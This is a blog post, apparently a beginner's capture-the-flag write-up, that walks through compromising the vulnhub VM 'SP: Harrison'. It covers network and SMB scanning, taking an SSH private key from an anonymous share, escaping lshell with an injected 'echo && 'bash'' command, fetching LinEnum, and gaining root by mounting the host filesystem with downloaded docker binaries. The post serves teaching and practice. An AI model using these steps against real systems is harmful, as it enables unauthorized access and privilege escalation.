---
title: "Writup - SP: Harrison"
date: 2019-05-25T21:23:54-07:00
---
Welcome to my blog!  This is my first write up on a vulnhub VM.  The VM in question is by [Daniel Solstad](https://dsolstad.com/), and is hosted by [vulnhub.com](vulnhub.com).

### Summary:
* Scan the network
* Scan the host
* Check out SMB
* Break out of a restricted shell
* Enumerate the host
* Get the root flag

#### Scan the Network:

First we use netdiscover to see where the vulnerable system is.
```
netdiscover -r 192.168.99.0/24
```
```
Currently scanning: Finished! | Screen View: Unique Hosts

4 Captured ARP Req/Rep packets, from 4 hosts. Total size: 240
_____________________________________________________________________________
IP At MAC Address Count Len MAC Vendor / Hostname
-----------------------------------------------------------------------------
192.168.99.1    52:54:00:12:35:00 1 60 Unknown vendor
192.168.99.2    52:54:00:12:35:00 1 60 Unknown vendor
192.168.99.3    08:00:27:dc:37:c5 1 60 PCS Systemtechnik GmbH
192.168.99.23   08:00:27:45:0b:aa 1 60 PCS Systemtechnik GmbH
```
Boom, we have out host!

#### Scan the Host:

Now we're going to fire up nmap, and scan the host.

```
nmap -T4 -A -p- 192.168.99.23
```
```
Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-24 16:51 PDT
Nmap scan report for 192.168.99.23
Host is up (0.00059s latency).
Not shown: 65533 closed ports
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 2048 5b:87:f1:fe:67:8f:a6:ba:8b:75:3c:11:34:3d:b6:b8 (RSA)
| 256 93:87:7e:2e:5e:4e:ce:71:56:a1:1c:6b:fc:1f:6e:55 (ECDSA)
|_ 256 c0:14:c0:24:e8:a8:7e:d4:cd:a6:42:25:f3:48:47:94 (ED25519)
445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
MAC Address: 08:00:27:45:0B:AA (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: HARRISON; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 5s, deviation: 1s, median: 4s
| smb-os-discovery:
| OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
| Computer name: harrison
| NetBIOS computer name: HARRISON\x00
| Domain name: \x00
| FQDN: harrison
|_ System time: 2019-05-24T23:52:14+00:00
| smb-security-mode:
| account_used: guest
| authentication_level: user
| challenge_response: supported
|_ message_signing: disabled (dangerous, but default)
| smb2-security-mode:
| 2.02:
|_ Message signing enabled but not required
| smb2-time:
| date: 2019-05-24 16:52:15
|_ start_date: N/A

TRACEROUTE
HOP RTT ADDRESS
1 0.59 ms 192.168.99.23

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.77 seconds
```
From the scan, we can see that port 445 (SMB) is open.  SMB usually indicates file shares.  Let's do another scan and see if we can get some more information.  Nmap has a great script for hunting for SMB shares:

```
nmap --script=smb-enum-shares 192.168.99.23
```
```
Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-24 16:56 PDT
Nmap scan report for 192.168.99.23
Host is up (0.00015s latency).
Not shown: 998 closed ports
PORT STATE SERVICE
22/tcp open ssh
445/tcp open microsoft-ds
MAC Address: 08:00:27:45:0B:AA (Oracle VirtualBox virtual NIC)

Host script results:
| smb-enum-shares:
| account_used: <blank>
| \\192.168.99.23\IPC$:
| Type: STYPE_IPC_HIDDEN
| Comment: IPC Service (Samba 4.7.6-Ubuntu)
| Users: 1
| Max Users: <unlimited>
| Path: C:\tmp
| Anonymous access: READ/WRITE
| \\192.168.99.23\Private:
| Type: STYPE_DISKTREE
| Comment:
| Users: 0
| Max Users: <unlimited>
| Path: C:\home\harrison
|_ Anonymous access: READ/WRITE

Nmap done: 1 IP address (1 host up) scanned in 4.76 seconds
```
Well, well, well, looks like Harrison's home directory is wide open!  Let's connect and see what's in there.

#### Check out SMB:

Since anonymous access is enabled, we can just use smbclient to connect to the share and poke around:

```
smbclient -N //192.168.99.23/Private
```
```
root@kali:~# smbclient -N //192.168.99.23/Private
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \>
```
Once we're in, we can see that we are indeed in a home directory.  Let's grab some interesting files:
```
smb: \> ls
. D 0 Thu Apr 18 09:55:51 2019
.. D 0 Thu Apr 18 09:12:55 2019
.bash_logout H 220 Wed Apr 4 11:30:26 2018
.profile H 807 Wed Apr 4 11:30:26 2018
.bashrc H 3771 Wed Apr 4 11:30:26 2018
silly_cats D 0 Thu Apr 18 09:55:51 2019
.ssh DH 0 Thu Apr 18 09:42:57 2019
flag.txt N 32 Thu Apr 18 09:14:18 2019

32894736 blocks of size 1024. 27324024 blocks available
smb: \> get flag.txt
getting file \flag.txt of size 32 as flag.txt (3.1 KiloBytes/sec) (average 3.1 KiloBytes/sec)
smb: \> get .ssh\
.ssh\authorized_keys .ssh\id_rsa .ssh\id_rsa.pub
smb: \> get .ssh\id_rsa
getting file \.ssh\id_rsa of size 1679 as .ssh\id_rsa (164.0 KiloBytes/sec) (average 83.5 KiloBytes/sec)
```
We have a user flag!  Let's download it and check it out.  We also have a private key in the .ssh folder.  We can probably use this to log into the system via SSH.

First we'll check out the flag:

```
cat flag.txt
```
```
root@kali:~# cat flag.txt
It's not going to be that easy.
```
Wouldn't be much of a prison if we could just grab the flag off an open file share, would it?  Let's SSH in (after fixing the permissions on the private key):

```
chmod 600 id_rsa && ssh -i id_rsa harrison@192.168.99.23
```
```
root@kali:~# chmod 600 id_rsa
root@kali:~# ssh -i id_rsa harrison@192.168.99.23
The authenticity of host '192.168.99.23 (192.168.99.23)' can't be established.
ECDSA key fingerprint is SHA256:4dYpYoutbqxX67U1GWar5n+R7JcfOY9yGk2HJbI1mKs.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.99.23' (ECDSA) to the list of known hosts.

Welcome to Harrison. Enjoy your shell.

Type '?' or 'help' to get the list of allowed commands
harrison:~$
```
Boom, we got a user shell!

#### Break out of a restricted shell:

Looks like the shell we have is pretty locked down:

```
harrison:~$ ls
flag.txt silly_cats
harrison:~$ cd /
*** forbidden path: /
harrison:~$ sudo -l
*** forbidden sudo command: sudo -l
harrison:~$ ?
cd clear echo exit help history ll lpath ls lsudo
```

This is our toolkit.  Not much to work with.  In order to break out, we'll need to figure out which restricted shell we're in.

```
harrison:~$ echo $SHELL
*** forbidden path: /usr/bin/lshell
```
OK, so it's something called [lshell](https://github.com/ghantoos/lshell).  To escape the shell, I did some searching, and found a bug on the lshell bugtracker that we can use to get into a real shell:
```
harrison:~$ echo && 'bash'
harrison@harrison:~$
```
#### Enumerate the Host:

Now that we have a real shell, let's do some manual host enumeration. Just for fun, we check /root, and find that we can read the files in it!
```
harrison@harrison:~$ ls /root
flag.txt
harrison@harrison:~$ cat /root/flag.txt
Nope. No flags here. Where do you think you are?
```
Well, hmm.  Looks like the flag isn't here.  But the name of the game is to read the root flag, right?  Let's keep looking.  We can poke at the host by hand, but I like using this LinEnum script:

```
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh && chmod +x LinEnum.sh && ./LinEnum.sh
```
```
harrison@harrison:~$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
--2019-05-25 00:35:05-- https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.40.133
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.40.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 45639 (45K) [text/plain]
Saving to: 'LinEnum.sh'

LinEnum.sh 100%[========================================>] 44.57K --.-KB/s in 0.06s

2019-05-25 00:35:06 (740 KB/s) - 'LinEnum.sh' saved [45639/45639]

harrison@harrison:~$ chmod +x LinEnum.sh
harrison@harrison:~$ ./LinEnum.sh
```
The output from this command is pretty long, and you should definitely read through it all, so you know what it's capable of, but in the interest of shortening the post, I'll show you what caught my eye:
```
[+] Looks like we're in a Docker container:
12:blkio:/docker/487be6aafa6f7791ab73237ca612e8d7a59326a15aa7fdb4a5fbfbcf69cc91d2
11:perf_event:/docker/487be6aafa6f7791ab73237ca612e8d7a59326a15aa7fdb4a5fbfbcf69cc91d2
9:memory:/docker/487be6aafa6f7791ab73237ca612e8d7a59326a15aa7fdb4a5fbfbcf69cc91d2
8:devices:/docker/487be6aafa6f7791ab73237ca612e8d7a59326a15aa7fdb4a5fbfbcf69cc91d2
7:freezer:/docker/487be6aafa6f7791ab73237ca612e8d7a59326a15aa7fdb4a5fbfbcf69cc91d2
6:net_cls,net_prio:/docker/487be6aafa6f7791ab73237ca612e8d7a59326a15aa7fdb4a5fbfbcf69cc91d2
5:cpuset:/docker/487be6aafa6f7791ab73237ca612e8d7a59326a15aa7fdb4a5fbfbcf69cc91d2
4:hugetlb:/docker/487be6aafa6f7791ab73237ca612e8d7a59326a15aa7fdb4a5fbfbcf69cc91d2
3:pids:/docker/487be6aafa6f7791ab73237ca612e8d7a59326a15aa7fdb4a5fbfbcf69cc91d2
2:cpu,cpuacct:/docker/487be6aafa6f7791ab73237ca612e8d7a59326a15aa7fdb4a5fbfbcf69cc91d2
1:name=systemd:/docker/487be6aafa6f7791ab73237ca612e8d7a59326a15aa7fdb4a5fbfbcf69cc91d2
-rwxr-xr-x 1 root root 0 May 24 23:39 /.dockerenv

[+] We're a member of the (docker) group - could possibly misuse these rights!
uid=1000(harrison) gid=1000(harrison) groups=1000(harrison),27(sudo),999(docker)
```
Jackpot!  We're in a Docker container.  Even better, we're a member of the docker group.  That means we can run docker ourselves.  Without getting too technical, when you run a docker container, unless you tell it not to, it'll run as root.  If you run a container as root (Which you're allowed to do as a member of the Docker group), and mount the underlying file system, you basically have root on that system!  Pretty neat, huh?

Let's see how it's done

#### Get the Root Flag:

To misuse docker, we need to run it.  Alas:
```
harrison@harrison:~$ docker
bash: docker: command not found
harrison@harrison:~$ which docker
harrison@harrison:~$
```
Docker isn't installed in the container.  Installing it would be tricky, since we don't have sudo, or the root password.  Good news is that Docker offers the binaries for download, without needing to install them:

```
wget https://download.docker.com/linux/static/stable/x86_64/docker-18.03.0-ce.tgz && tar zxf docker-18.03.0-ce.tgz && cd docker && ./docker
```
```
harrison@harrison:~$ wget https://download.docker.com/linux/static/stable/x86_64/docker-18.03.0-ce.tgz
--2019-05-25 00:50:07-- https://download.docker.com/linux/static/stable/x86_64/docker-18.03.0-ce.tgz
Resolving download.docker.com (download.docker.com)... 13.224.2.97, 13.224.2.123, 13.224.2.101, ...
Connecting to download.docker.com (download.docker.com)|13.224.2.97|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 38752537 (37M) [application/x-tar]
Saving to: 'docker-18.03.0-ce.tgz'

docker-18.03.0-ce.tgz 100%[============================================================================================================>] 36.96M 13.1MB/s in 2.8s

2019-05-25 00:50:10 (13.1 MB/s) - 'docker-18.03.0-ce.tgz' saved [38752537/38752537]

harrison@harrison:~$ tar zxf docker-18.03.0-ce.tgz
harrison@harrison:~$ ls
LinEnum.sh docker docker-18.03.0-ce.tgz flag.txt silly_cats
harrison@harrison:~$ cd docker
harrison@harrison:~/docker$ ls
docker docker-containerd docker-containerd-ctr docker-containerd-shim docker-init docker-proxy docker-runc dockerd
harrison@harrison:~/docker$ ./docker
```
Now let's run the container.  We're going to mount the root filesystem for the underlying host at the /home directory in the new container:

```
./docker run -it -v /:/home/ ubuntu bash
```
```
harrison@harrison:~/docker$ ./docker run -it -v /:/home/ ubuntu bash
root@bec2ede58b0f:/#
```
Note that the prompt changes.  We're now the root user in this new container.  Let's take a look at the home directory:

```
cat /home/root/flag.txt
```
```
root@bec2ede58b0f:/# ls # This is the container file system
bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var
root@bec2ede58b0f:/# cd /home
root@bec2ede58b0f:/home# ls # This is the file system on the host!
bin boot dev etc home initrd.img initrd.img.old lib lib64 lost+found media mnt opt proc root run sbin srv swapfile sys tmp usr var vmlinuz vmlinuz.old
root@bec2ede58b0f:/home# cat root/flag.txt
Do you think you are out?

Just kidding, here is your flag: 1xcDF933mce
```
And that's that!  I hope you enjoyed reading this!  I'm certainly not and expert at pentesting, but I'm going to try and continue doing writeups of boxes that I'm successful at breaking into.